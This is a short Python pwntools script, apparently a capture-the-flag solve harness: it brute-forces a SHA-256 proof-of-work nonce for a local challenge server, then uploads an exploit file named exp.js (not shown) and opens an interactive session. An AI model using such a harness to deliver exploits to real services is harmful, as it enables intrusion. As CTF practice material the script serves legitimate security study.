from pwn import *
import hashlib


p = remote("127.0.0.1",7000)
p.recvuntil("nonce) == ")
target_hash = p.recv(64).decode()

def pow(target_hash):
    nonce = 0
    while nonce < 0x1000000:
        data = b'rctf' + f'{nonce:06x}'.encode()
        current_hash = hashlib.sha256(data).hexdigest()
        if current_hash == target_hash:
            return f'{nonce:06x}'.encode()
        nonce += 1
        if nonce % 1000000 == 0:
            print("current hash:")
            print(current_hash)
    print("pow failed.")
    exit(0)

nonce = pow(target_hash)
p.recvuntil('nonce:')
p.send(nonce)

js_script = ""

with open("exp.js","r") as f:
    js_script = f.read()

p.recvuntil("script size:")
p.sendline(str(len(js_script)))
p.recvuntil("script:")
p.send(js_script)

p.interactive()